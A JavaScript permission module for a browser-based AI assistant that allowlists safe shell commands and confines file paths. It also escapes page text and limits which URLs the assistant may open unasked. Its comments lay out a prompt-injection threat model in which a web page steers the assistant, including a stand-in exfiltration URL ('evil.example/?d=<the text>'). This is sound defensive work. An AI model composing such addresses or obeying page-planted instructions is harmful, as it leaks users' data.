// AI assistant: what it may do without asking the user.
//
// One policy for both ways the assistant runs:
//   - the in-browser agents (ChatGPT, API keys): chatgpt.sys.mjs executes what
//     safeCommand() returns directly, program and arguments, without a shell;
//   - Claude Code: kit-ai.uc.js answers its permission requests from here, and
//     Claude Code then runs the same string in the user's shell (bash or zsh).
// So a command is safe only if a shell reads it exactly as this module does:
// plain words and quoted strings, commands joined by &&, nothing a shell would
// expand, redirect or substitute. Everything else is not refused — it goes to
// the user as an approval card.
//
// Options are allowlisted one by one, never blocklisted: git accepts any
// unambiguous prefix of a long option (--outp is --output, which writes a file),
// and every program has options that read or write where they shouldn't.
//
// Pure functions without browser APIs: tests/policy.test.mjs runs them under
// node (bin/check). The caller supplies the context:
//   { repo, user, home, real }
//   repo, user — the base and the personal layer, symlinks resolved (user may be null);
//   home       — the home folder, for a leading ~/;
//   real(path) — the absolute path with symlinks resolved; for a path that doesn't
//                exist yet, its nearest existing folder resolved plus the rest.

const inside = (path, root) => !!root && (path === root || path.startsWith(root + "/"));

// ---------------------------------------------------------------- command line

// Characters a word may contain outside quotes. Not here, so not allowed bare:
// ; & | < > ( ) $ ` \ newline (shell syntax), * ? [ ] { } ^ # ! (bash and zsh
// expand them — a file named "--output=x" would turn "git log *" into an option).
const WORD = /[\p{L}\p{N}_@%+=:,.\/~-]/u;

// A command line → [[word, …], …], one list per command joined by &&.
// null — the line has something a shell would treat specially.
export function parseCommand(line, home = "") {
  const text = String(line ?? "").trim();
  const commands = [[]];
  let word = null; // null — between words
  const endWord = () => {
    if (word !== null) {
      commands.at(-1).push(word);
      word = null;
    }
  };
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (c === " " || c === "\t") {
      endWord();
    } else if (c === "'") {
      const end = text.indexOf("'", i + 1);
      if (end < 0) {
        return null;
      }
      word = (word ?? "") + text.slice(i + 1, end);
      i = end;
    } else if (c === '"') {
      let value = "";
      for (i++; ; i++) {
        const d = text[i];
        if (d === undefined || d === "$" || d === "`") {
          return null; // unterminated, or the shell would substitute here
        }
        if (d === '"') {
          break;
        }
        if (d === "\\") {
          const next = text[i + 1];
          if (next === '"' || next === "\\") {
            value += next;
            i++;
            continue;
          }
          if (next === undefined || next === "\n" || next === "$" || next === "`") {
            return null;
          }
        }
        value += d;
      }
      word = (word ?? "") + value;
    } else if (c === "&" && text[i + 1] === "&") {
      endWord();
      if (!commands.at(-1).length) {
        return null;
      }
      commands.push([]);
      i++;
    } else if (WORD.test(c)) {
      if (c === "~") {
        const next = text[i + 1];
        if (word === null) {
          // the shell expands a leading ~ ; only "~" and "~/…" are the home folder
          if (!home || !(next === undefined || next === "/" || next === " " || next === "\t")) {
            return null;
          }
          word = home;
          continue;
        }
        // name=~/… is expanded by bash too
        if (/[=:]/.test(text[i - 1])) {
          return null;
        }
      }
      if (c === "=" && word === null) {
        return null; // zsh: =name is the path of a command
      }
      word = (word ?? "") + c;
    } else {
      return null;
    }
  }
  endWord();
  return commands.every(words => words.length) ? commands : null;
}

// ---------------------------------------------------------------- paths

// A path argument of a command: the real path if it stays inside the repository
// or the personal layer, else null. A relative one is relative to the repository
// root, where commands run. ".." is refused outright: the shell resolves the
// path on its own, through links, and must not end up elsewhere than we checked.
function confine(word, ctx) {
  if (!word || word.startsWith("-") || word.split("/").includes("..")) {
    return null;
  }
  let path;
  try {
    path = ctx.real(word.startsWith("/") ? word : `${ctx.repo}/${word}`);
  } catch (e) {
    return null;
  }
  return inside(path, ctx.repo) || inside(path, ctx.user) ? path : null;
}

// Files that run as code: scripts and everything in bin/ (bin/theme, bin/mod…
// run without asking). Writing them always asks, so a page can't talk the
// assistant into a privileged script unnoticed (README, Security).
// Case-insensitive: so are macOS file names and fx-autoconfig's *.uc.js.
const CODE_FILE = /\.(c?js|mjs|sh|py|swift)$|^bin\//i;

// Third-party code that is overwritten on update (see AGENTS.md).
const READ_ONLY_DIRS = ["zen-source", "profile/chrome/utils", "program"];

// Where a write would land: { path, relative, readOnly, code }.
// null — outside the repository and the personal layer.
//   readOnly — must not be written at all: third-party folders and any .git
//              (git runs what its config and hooks say, in nested repositories too);
//   code     — runs as code: needs the user's approval.
export function writeTarget(path, ctx) {
  let real;
  try {
    real = ctx.real(path);
  } catch (e) {
    return null;
  }
  const root = inside(real, ctx.user) ? ctx.user : inside(real, ctx.repo) ? ctx.repo : null;
  if (!root) {
    return null;
  }
  const relative = real.slice(root.length + 1);
  const parts = relative.toLowerCase().split("/");
  return {
    path: real,
    relative,
    readOnly:
      parts.includes(".git") ||
      (root === ctx.repo && READ_ONLY_DIRS.some(dir => relative === dir || relative.startsWith(dir + "/"))),
    code: CODE_FILE.test(relative),
  };
}

// ---------------------------------------------------------------- commands

// git: the subcommands that only read, stage or commit, each with the options
// that neither write a file (--output), run a program (--ext-diff, -c …) nor
// read outside the repository (--no-index, -F). `valued` options take the next
// word as their value.
const GIT = {
  status: {
    flags: /^(-s|--short|-b|--branch|-sb|--porcelain(=v[12])?|--long|-u(no|normal|all)?|--untracked-files(=(no|normal|all))?|--ignored|--show-stash)$/,
  },
  diff: {
    flags: /^(--cached|--staged|--stat(=[\d,]+)?|--shortstat|--numstat|--name-only|--name-status|--summary|--check|-p|--patch|-U\d+|--unified=\d+|-w|-b|--ignore-all-space|--ignore-space-change|--word-diff(=(color|plain|porcelain|none))?|--color(=(always|never|auto))?|--no-color|-M|--find-renames|--minimal|--diff-filter=[A-Za-z]+)$/,
  },
  log: {
    flags: /^(--oneline|-\d+|--max-count=\d+|--skip=\d+|--stat(=[\d,]+)?|--shortstat|--numstat|--name-only|--name-status|-p|--patch|-U\d+|--graph|--decorate(=(short|full|auto|no))?|--no-decorate|--all|--reverse|--follow|--abbrev-commit|--no-merges|--merges|--first-parent|--date=[\w:%-]+|--(format|pretty)=[\s\S]*|--(since|until|after|before|author|grep)=[\s\S]*|-i|-[SG][\s\S]+|--color(=(always|never|auto))?|--no-color)$/,
    valued: { "-n": /^\d+$/ },
  },
  add: {
    flags: /^(-A|--all|-u|--update|-v|--verbose|-N|--intent-to-add)$/,
  },
  commit: {
    flags: /^(-a|--all|-q|--quiet|-v|--verbose|--amend|--no-edit|--allow-empty|--message=[\s\S]*)$/,
    valued: { "-m": /^[\s\S]*$/, "-am": /^[\s\S]*$/ },
  },
};

function gitCommand(words, ctx) {
  const args = [];
  let i = 1;
  // -C: only the base or the personal layer itself, by absolute path — git must
  // read the configuration of these two repositories and of no other
  if (words[i] === "-C") {
    const dir = words[i + 1]?.startsWith("/") ? confine(words[i + 1], ctx) : null;
    if (!dir || (dir !== ctx.repo && dir !== ctx.user)) {
      return null;
    }
    args.push("-C", dir);
    i += 2;
  }
  const sub = words[i++];
  if (!Object.hasOwn(GIT, sub)) {
    return null;
  }
  const rule = GIT[sub];
  args.push(sub);
  let paths = false; // after "--" everything is a path
  for (; i < words.length; i++) {
    const word = words[i];
    if (!paths && word === "--") {
      paths = true;
    } else if (!paths && word.startsWith("-")) {
      const value = rule.valued && Object.hasOwn(rule.valued, word) ? rule.valued[word] : null;
      if (value) {
        if (i + 1 >= words.length || !value.test(words[i + 1])) {
          return null;
        }
        args.push(word, words[++i]);
        continue;
      }
      if (!rule.flags.test(word)) {
        return null;
      }
    } else if (word.startsWith("/")) {
      // git diff compares any two files once one of them is outside the repository
      if (!confine(word, ctx)) {
        return null;
      }
    } else if (!word || word.split("/").includes("..")) {
      return null; // a revision (a..b is fine) or a path, but not one that climbs out
    }
    args.push(word);
  }
  return { program: "git", args };
}

function lsCommand(words, ctx) {
  for (const word of words.slice(1)) {
    if (!/^-[1AFGHLRSTachilprst]+$/.test(word) && !confine(word, ctx)) {
      return null;
    }
  }
  return { program: "ls", args: words.slice(1) };
}

function grepCommand(words, ctx) {
  let pattern = false;
  let paths = false;
  for (let i = 1; i < words.length; i++) {
    const word = words[i];
    if (!paths && word === "--") {
      paths = true;
    } else if (!paths && word.startsWith("-")) {
      if (word === "-e") {
        if (i + 1 >= words.length) {
          return null;
        }
        pattern = true;
        i++;
      } else if (/^-[ABCm]$/.test(word)) {
        if (!/^\d+$/.test(words[++i] ?? "")) {
          return null;
        }
      } else if (
        // no -f (patterns from a file) and nothing else that names a file to read
        !/^-[EFGHIRabchilnorsvwx]+$/.test(word) &&
        !/^-[ABCm]\d+$/.test(word) &&
        !/^--(include|exclude|exclude-dir)=[^/]*$/.test(word) &&
        !/^--color(=(always|never|auto))?$/.test(word)
      ) {
        return null;
      }
    } else if (!pattern) {
      pattern = true;
    } else if (!confine(word, ctx)) {
      return null;
    }
  }
  return pattern ? { program: "grep", args: words.slice(1) } : null;
}

// The project's own commands: bin/check, bin/status, bin/sync [--quiet],
// bin/theme|mod|site with plain names. Writing these files asks (CODE_FILE).
function binCommand(words, ctx) {
  let name = words[0].replace(/^\.\//, "");
  if (name.startsWith("/")) {
    const path = confine(name, ctx);
    if (!path || !inside(path, ctx.repo)) {
      return null;
    }
    name = path.slice(ctx.repo.length + 1);
  }
  const args = words.slice(1);
  const ok =
    (/^bin\/(check|status)$/.test(name) && !args.length) ||
    (name === "bin/sync" && (!args.length || (args.length === 1 && args[0] === "--quiet"))) ||
    (/^bin\/(theme|mod|site)$/.test(name) && args.every(arg => /^[\w.-]+$/.test(arg)));
  return ok ? { program: name, args } : null;
}

// A command line the assistant may run without asking → [{ program, args }, …]
// (one per command joined by &&; run them in order, stop at the first failure).
// program is "git", "ls", "grep" or "bin/<name>" (relative to the repository).
// null — ask the user.
export function safeCommand(line, ctx) {
  const commands = parseCommand(line, ctx.home);
  if (!commands) {
    return null;
  }
  const result = [];
  for (const words of commands) {
    const program = words[0];
    const safe =
      program === "git"
        ? gitCommand(words, ctx)
        : program === "ls"
          ? lsCommand(words, ctx)
          : program === "grep"
            ? grepCommand(words, ctx)
            : binCommand(words, ctx);
    if (!safe) {
      return null;
    }
    result.push(safe);
  }
  return result;
}

// ---------------------------------------------------------------- pages

// The <browser-context> block that opens a user message: the active tab and
// the text selected on it. The title and the selection are written by the page,
// and the block sits inside the user's own message, so they go in as JSON
// strings with < and > escaped: whatever a page puts there stays inside its
// string and can't close the block and carry on as if the user had typed it.
export function browserContext({ tab, title, url, selection }) {
  const data = { active_tab: tab, title: String(title ?? "").slice(0, 300), url: String(url ?? "") };
  if (selection) {
    data.selected_text = String(selection).slice(0, 4000);
  }
  const json = JSON.stringify(data, null, 1).replace(/</g, "\\u003c").replace(/>/g, "\\u003e");
  return `<browser-context>\n${json}\n</browser-context>\n\n`;
}

// ---------------------------------------------------------------- addresses

// open_url: whether the assistant may open an address without asking.
// It reads pages (mail, documents), and a page can talk it into things, so an
// address it composes is a way to hand what it read to someone else:
// https://evil.example/?d=<the text>. Without asking it opens only what
// somebody else wrote:
//   - a site the user named in this chat (its host is in their messages);
//   - an address it has seen exactly as is: an open tab, a page it read, a link
//     on such a page;
//   - a search in the user's search engine: a query is composed by nature and
//     goes where the user's own queries go. Only the search page itself — search
//     sites have redirect pages too.
// Anything else asks, and the card shows the address.
// A page can still list many addresses and have the assistant choose among
// them: that carries a few bits per visit, not a mailbox.

// An address as it is compared: without the #fragment. "" — not an address.
export function urlKey(url) {
  try {
    const parsed = new URL(url);
    parsed.hash = "";
    return parsed.href;
  } catch (e) {
    return "";
  }
}

// Whether a text names a host: as a whole name or as the end of a longer one
// ("docs.example.com" names example.com; "notexample.com" and
// "example.com.evil.org" don't).
export function hostMentioned(text, host) {
  if (!host) {
    return false;
  }
  const escaped = host.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  return new RegExp(`(^|[^a-z0-9-])${escaped}(?![a-z0-9-]|\\.[a-z0-9])`, "i").test(String(text));
}

// userTexts — what the user typed in this chat; seen — a Set of urlKey()s the
// assistant was shown; searchUrl — any search in the user's search engine.
export function urlAllowed(url, { userTexts = [], seen = new Set(), searchUrl = "" } = {}) {
  let parsed;
  try {
    parsed = new URL(url);
  } catch (e) {
    return false;
  }
  if (!/^https?:$/.test(parsed.protocol) || parsed.username || parsed.password) {
    return false;
  }
  if (seen.has(urlKey(url))) {
    return true;
  }
  try {
    const search = new URL(searchUrl);
    if (parsed.origin === search.origin && parsed.pathname === search.pathname) {
      return true;
    }
  } catch (e) {}
  const host = parsed.hostname.toLowerCase().replace(/^www\./, "");
  return userTexts.some(text => hostMentioned(text, host));
}

// ---------------------------------------------------------------- spoken answers

// Voice input while an approval card waits: a phrase → "allow", "deny" or null
// (not an answer — it goes to the message field as usual). Only a phrase that
// is nothing but the answer counts: "yes, but show me the file first" is not a
// yes. "Allow all …" has no spoken form on purpose.
// English and Russian out of the box; extra holds more words per answer
// (the prefs kit.ai.voice-allow / kit.ai.voice-deny, see user.js).
const SPOKEN = {
  allow: [
    "allow",
    "allow it",
    "yes",
    "yes allow",
    "ok",
    "okay",
    "go ahead",
    "разреши",
    "разрешить",
    "разрешаю",
    "да",
    "да разреши",
    "можно",
    "хорошо",
    "давай",
  ],
  deny: [
    "deny",
    "deny it",
    "no",
    "no deny",
    "don't allow",
    "do not allow",
    "cancel",
    "запрети",
    "запретить",
    "запрещаю",
    "нет",
    "нет запрети",
    "не разрешай",
    "не разрешаю",
    "нельзя",
    "не надо",
    "отклони",
    "отклонить",
    "отмена",
  ],
};

// As spoken: speech recognition adds capitals and punctuation of its own.
const spoken = phrase =>
  String(phrase ?? "")
    .toLowerCase()
    .replace(/[’`]/g, "'")
    .replace(/ё/g, "е")
    .replace(/[^\p{L}\p{N}']+/gu, " ")
    .trim();

export function spokenAnswer(text, extra = {}) {
  const phrase = spoken(text);
  if (!phrase) {
    return null;
  }
  // "deny" first: a word that ended up in both lists must not allow
  for (const answer of ["deny", "allow"]) {
    if ([...SPOKEN[answer], ...(extra[answer] || [])].some(word => spoken(word) === phrase)) {
      return answer;
    }
  }
  return null;
}
